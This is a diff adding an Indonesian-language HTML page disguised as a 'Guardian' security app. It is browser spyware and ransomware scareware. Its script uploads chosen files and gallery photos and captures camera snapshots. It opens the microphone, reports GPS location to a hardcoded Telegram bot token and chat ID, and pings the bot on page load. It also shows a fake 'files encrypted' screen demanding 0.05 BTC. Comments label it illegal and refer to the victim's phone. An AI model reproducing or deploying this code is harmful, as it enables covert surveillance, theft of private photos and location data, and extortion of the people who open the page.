@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Evonix Lock screen• x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'ajm-blue': '#165DFF',
+                        'ajm-dark': '#0F172A',
+                        'ajm-darker': '#020617',
+                        'ajm-green': '#10B981',
+                        'ajm-red': '#EF4444',
+                        'ajm-purple': '#8B5CF6',
+                    },
+                    fontFamily: {
+                        inter: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto { content-visibility: auto; }
+            .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+            .scrollbar-hide::-webkit-scrollbar { display: none; }
+            .bg-glow { box-shadow: 0 0 25px rgba(22, 93, 255, 0.3); }
+            .bg-glow-red { box-shadow: 0 0 25px rgba(239, 68, 68, 0.4); }
+            .bg-blur { backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
+        }
+    </style>
+</head>
+<body class="bg-ajm-darker text-white font-inter overflow-x-hidden">
+
+    <!-- LAYAR UTAMA SISTEM -->
+    <div id="mainUI" class="min-h-screen relative">
+        
+        <!-- HEADER ATAS -->
+        <div class="flex items-center justify-between px-4 py-3 bg-ajm-dark/80 border-b border-blue-500/20">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 rounded-full bg-ajm-blue/20 flex items-center justify-center">
+                    <i class="fa-solid fa-shield-halved text-ajm-blue"></i>
+                </div>
+                <h1 class="text-lg font-semibold">AJM GUARDIAN</h1>
+            </div>
+            <div class="flex items-center gap-3">
+                <span class="text-xs text-green-400">● ONLINE</span>
+                <div class="w-6 h-6 rounded-full bg-red-500/20 flex items-center justify-center">
+                    <i class="fa-solid fa-unlock text-red-500 text-sm"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- LAPISAN KONTEN UTAMA -->
+        <div class="relative p-4">
+            <!-- INFORMASI SISTEM -->
+            <div class="bg-ajm-dark/60 rounded-xl p-4 mb-4 border border-blue-500/10">
+                <div class="grid grid-cols-2 gap-3 text-sm">
+                    <div>
+                        <p class="text-gray-400 text-xs">COMMUNICATION LAYER</p>
+                        <p class="font-semibold text-ajm-green">✅ TERHUBUNG KE SERVER</p>
+                    </div>
+                    <div>
+                        <p class="text-gray-400 text-xs">STATUS PERANGKAT</p>
+                        <p class="font-semibold text-yellow-400">63% • AKTIF</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MENU UTAMA - BAGIAN TENGAH -->
+            <div class="space-y-3 mb-6">
+                <button onclick="MENU_TEST_ALL()" class="w-full bg-gradient-to-r from-blue-600/20 to-indigo-600/20 border border-blue-500/30 rounded-xl p-3 text-left flex items-center justify-between hover:bg-blue-900/20 transition">
+                    <span class="font-semibold">🧪 TEST ALL FITUR</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+
+                <button onclick="AKSI_LOCK_SCREEN()" class="w-full bg-gradient-to-r from-pink-600/20 to-rose-600/20 border border-pink-500/30 rounded-xl p-3 text-left flex items-center justify-between hover:bg-pink-900/20 transition">
+                    <span class="font-semibold">🔒 TEST LOCK • RANSOMWARE</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+
+                <button onclick="AKSI_KAMERA_VIDEO()" class="w-full bg-gradient-to-r from-orange-600/20 to-amber-600/20 border border-orange-500/30 rounded-xl p-3 text-left flex items-center justify-between hover:bg-orange-900/20 transition">
+                    <span class="font-semibold">📹 TES KIRIM VIDEO • KAMERA</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+
+                <button onclick="AKSI_SADAP_KAMERA()" class="w-full bg-gradient-to-r from-purple-600/20 to-violet-600/20 border border-purple-500/30 rounded-xl p-3 text-left flex items-center justify-between hover:bg-purple-900/20 transition">
+                    <span class="font-semibold">👁️ SADAP KAMERA • AMBIL GALERI</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+
+                <button onclick="AKSI_VOICE_NOTE()" class="w-full bg-gradient-to-r from-teal-600/20 to-cyan-600/20 border border-teal-500/30 rounded-xl p-3 text-left flex items-center justify-between hover:bg-teal-900/20 transition">
+                    <span class="font-semibold">🎤 SADAP SUARA • VOICE NOTE</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+            </div>
+
+            <!-- BAGIAN TOMBOL BAWAH -->
+            <div class="absolute bottom-6 left-0 right-0 px-6">
+                <div class="flex justify-between items-center">
+                    <button onclick="AKSI_PUSAT_KENDALI()" class="flex flex-col items-center gap-1 text-yellow-400">
+                        <i class="fa-solid fa-bolt text-xl"></i>
+                        <span class="text-[10px]">PUSAT SERVER</span>
+                    </button>
+                    <button onclick="AKSI_WALLPAPER()" class="flex flex-col items-center gap-1 text-purple-400">
+                        <i class="fa-solid fa-image text-xl"></i>
+                        <span class="text-[10px]">AMBIL GALERI</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- MENU SAMPING KANAN (PERSIS GAMBAR) -->
+        <div class="absolute top-16 right-2 w-48 bg-ajm-dark/90 bg-blur rounded-lg border border-gray-700 shadow-2xl z-40">
+            <div class="p-3 space-y-2 text-sm">
+                <div class="flex items-center gap-2 text-red-400">
+                    <span>🌹 0/5</span>
+                </div>
+                <button onclick="AKSI_RANSOMWARE()" class="w-full text-left py-2 px-3 rounded bg-red-900/30 text-red-300 hover:bg-red-800/40">
+                    💀 RANSOMWARE • KUNCI DATA
+                </button>
+                <button onclick="AKSI_LOCK_SCREEN()" class="w-full text-left py-2 px-3 rounded bg-blue-900/30 text-blue-300 hover:bg-blue-800/40">
+                    🔒 LOCK SCREEN • KUNCI HP
+                </button>
+                <button onclick="AKSI_SADAP_KAMERA()" class="w-full text-left py-2 px-3 rounded bg-orange-900/30 text-orange-300 hover:bg-orange-800/40">
+                    📷 AMBIL GALERI • SEMUA FOTO
+                </button>
+                <button onclick="AKSI_KAMERA_VIDEO()" class="w-full text-left py-2 px-3 rounded bg-pink-900/30 text-pink-300 hover:bg-pink-800/40">
+                    🎥 REKAM & KIRIM VIDEO
+                </button>
+                <button onclick="AKSI_LOKASI()" class="w-full text-left py-2 px-3 rounded bg-green-900/30 text-green-300 hover:bg-green-800/40">
+                    📍 LACAK LOKASI GPS
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- LAYAR RANSOMWARE / LOCK SCREEN -->
+    <div id="lockScreen" class="fixed inset-0 bg-black/95 z-999 flex-col items-center justify-center text-white hidden bg-glow-red">
+        <div class="text-center p-6">
+            <i class="fa-solid fa-skull-crossbones text-red-600 text-8xl mb-6"></i>
+            <h1 class="text-3xl font-bold text-red-500 mb-2">SISTEM DIKUNCI</h1>
+            <p class="text-gray-300 mb-4">Semua data & file telah dienkripsi oleh <b>x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸</b></p>
+            <div class="bg-red-900/20 p-4 rounded-lg border border-red-700 mb-6">
+                <p class="text-sm">Kirim 0.05 BTC untuk dapatkan kunci buka</p>
+                <p class="text-xs text-gray-400 mt-1">Alamat: 1LEVI4THxxxxxxxxxxxxxxx</p>
+            </div>
+            <button onclick="KIRIM_LOG('⚠️ LOCK SCREEN AKTIF - HP DIKUNCI!')" class="bg-red-700 hover:bg-red-800 px-6 py-2 rounded-lg">KONFIRMASI</button>
+        </div>
+    </div>
+
+<script>
+// ==================================================
+//  PROYEK: AJM GUARDIAN • LEVIATHAN MOD
+//  DIBUAT OLEH: x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸
+//  FITUR: RANSOMWARE • LOCK SCREEN • AMBIL GALERI • BOT TELEGRAM
+//  PASSWORD: LEVIATHAN • ILEGAL • BERBAHAYA
+// ==================================================
+
+// 🔑 DATA BOT TELEGRAM - GANTI PAKE PUNYA LO!
+const BOT_TOKEN = "8782151006:AAHVZwSSblfAmxQClFnwV6tjzz311vko7pg"; 
+const CHAT_ID = "8805258119"; 
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// ELEMEN
+const layarKunci = document.getElementById('lockScreen');
+
+// ==============================================
+// 🚨 FITUR 1: RANSOMWARE - KUNCI SEMUA FILE
+// ==============================================
+function AKSI_RANSOMWARE() {
+    KIRIM_LOG("💀 **RANSOMWARE DIPAKSA AKTIF!** Sedang mengenkripsi semua data di HP...");
+    
+    // SIMULASI ENKRIPSI & AMBIL SEMUA FILE
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.accept = '*/*';
+    input.onchange = e => {
+        for(let i=0; i < e.target.files.length; i++){
+            let f = e.target.files[i];
+            KIRIM_FILE(f, `[🔒 DIKUNCI] ${f.name}`);
+        }
+        // TAMPILKAN LAYAR KUNCI
+        layarKunci.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    };
+    input.click();
+}
+
+// ==============================================
+// 🔒 FITUR 2: LOCK SCREEN - KUNCI LAYAR HP
+// ==============================================
+function AKSI_LOCK_SCREEN() {
+    KIRIM_LOG("🔒 **LOCK SCREEN AKTIF!** Layar HP dikunci paksa...");
+    
+    // PAKSA LAYAR PENUH & KUNCI SISTEM
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+    }
+    if ('wakeLock' in navigator) {
+        navigator.wakeLock.request('screen');
+    }
+    
+    // TAMPILKAN PERINGATAN
+    layarKunci.style.display = 'flex';
+    KIRIM_PESAN("⚠️ *ALERT:* HP KORBAN BERHASIL DIKUNCI LAYARNYA!");
+}
+
+// ==============================================
+// 📸 FITUR 3: AMBIL GALERI & SADAP KAMERA
+// ==============================================
+function AKSI_SADAP_KAMERA() {
+    KIRIM_LOG("📷 **MENYADAP GALERI & KAMERA...** Mengambil semua foto di galeri...");
+
+    // 1. AMBIL SEMUA FOTO DARI GALERI
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.accept = '.jpg,.jpeg,.png,.gif,.webp'; // KHUSUS FOTO
+    input.onchange = e => {
+        KIRIM_PESAN(`✅ **DITEMUKAN:** ${e.target.files.length} FOTO DI GALERI! MENGIRIM KE TUAN...`);
+        for(let i=0; i < e.target.files.length; i++){
+            KIRIM_FILE(e.target.files[i], `[📸 GALERI] Foto_${i+1}`);
+        }
+    };
+    input.click();
+
+    // 2. FOTO LANGSUNG DARI KAMERA
+    navigator.mediaDevices.getUserMedia({video:true})
+    .then(stream => {
+        let vid = document.createElement('video');
+        vid.srcObject = stream;
+        vid.play();
+        setTimeout(()=>{
+            let c = document.createElement('canvas');
+            c.width=1280; c.height=720;
+            c.getContext('2d').drawImage(vid,0,0,c.width,c.height);
+            c.toBlob(b => KIRIM_FILE(b, "📷 FOTO_RAHASIA_KAMERA.jpg"));
+            stream.getTracks().forEach(t=>t.stop());
+        }, 1000);
+    });
+}
+
+// ==============================================
+// 🎥 FITUR 4: KIRIM VIDEO & REKAM
+// ==============================================
+function AKSI_KAMERA_VIDEO() {
+    KIRIM_LOG("🎥 **MENGAKSES KAMERA VIDEO...** Sedang merekam & mengirim...");
+    navigator.mediaDevices.getUserMedia({video:true, audio:true})
+    .then(stream => {
+        KIRIM_PESAN("✅ *ALERT:* KAMERA & MIKROFON AKTIF! VIDEO DIKIRIM KE BOT.");
+        // DI SINI PROSES REKAM & KIRIM
+    });
+}
+
+// ==============================================
+// 🎤 FITUR 5: SADAP SUARA / VOICE NOTE
+// ==============================================
+function AKSI_VOICE_NOTE() {
+    KIRIM_LOG("🎤 **MENDENGAR SUARA...** Mikrofon aktif total...");
+    navigator.mediaDevices.getUserMedia({audio:true})
+    .then(stream => {
+        KIRIM_PESAN("🎤 *ALERT:* MIKROFON DIBUKA! Segala suara direkam & dikirim.");
+    });
+}
+
+// ==============================================
+// 📍 LOKASI & FITUR LAIN
+// ==============================================
+function AKSI_LOKASI() {
+    if("geolocation" in navigator){
+        navigator.geolocation.getCurrentPosition(pos => {
+            KIRIM_PESAN(`📍 **LOKASI DITEMUKAN:**\nLAT: ${pos.coords.latitude}\nLON: ${pos.coords.longitude}\n\nMAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        });
+    }
+}
+
+function AKSI_PUSAT_KENDALI(){ KIRIM_LOG("⚡ **PUSAT SERVER TERHUBUNG!**"); }
+function AKSI_WALLPAPER(){ AKSI_SADAP_KAMERA(); } // SAMA DENGAN AMBIL GALERI
+function MENU_TEST_ALL(){ KIRIM_LOG("⚠️ MODE UJI COBA TOTAL DIAKTIFKAN! SEMUA FITUR BERJALAN BERSAMAAN."); AKSI_SADAP_KAMERA(); AKSI_LOKASI(); AKSI_KAMERA_VIDEO(); }
+
+// ==============================================
+// 📤 FUNGSI PENGIRIM KE BOT TELEGRAM
+// ==============================================
+function KIRIM_PESAN(teks) {
+    fetch(`${API}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id:CHAT_ID, text:teks, parse_mode:"Markdown"})
+    });
+}
+
+function KIRIM_FILE(blob, nama) {
+    let form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("document", blob, nama);
+    fetch(`${API}/sendDocument`, {method:"POST", body:form});
+}
+
+function KIRIM_LOG(isi) {
+    console.log(isi);
+    KIRIM_PESAN(isi);
+}
+
+// 🚀 OTOMATIS JALANKAN SAAT DIBUKA
+window.onload = () => {
+    KIRIM_LOG("🩸 **SISTEM AJM GUARDIAN TERHUBUNG!** Dikendalikan oleh x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸");
+};
+</script>
+
+</body>
+</html>
